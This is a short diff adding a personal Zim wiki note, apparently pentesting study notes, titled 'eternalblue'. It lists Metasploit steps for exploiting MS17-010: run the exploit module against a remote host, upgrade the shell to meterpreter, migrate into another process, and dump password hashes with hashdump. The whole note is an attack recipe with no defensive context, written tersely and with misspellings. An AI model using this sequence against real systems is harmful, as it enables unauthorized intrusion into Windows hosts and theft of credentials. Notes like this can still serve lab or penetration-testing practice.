@@ -1,0 +1,29 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.4
+Creation-Date: 2020-05-14T08:47:55-04:00
+
+====== eternalblue ======
+Created Thursday 14 May 2020
+
+vun---ms2017_010
+
+.msfconsole
+
+search  ms17_010
+set rhosts and run
+once initilize background this shell (CTRL +Z)
+
+now convert shell to meterperter
+
+search shell_to_meterpeter
+use post/multi/manage/shell_to_meterpreter
+
+set above backgound process session (sessions -l to check )
+run
+once finished check whoami  ,background this and switch to meterpreter shell sessions 2(in my case)
+
+ps to check the running process
+migrate PID/PPID 
+
+--hashdump (dump all hashes ) 
+
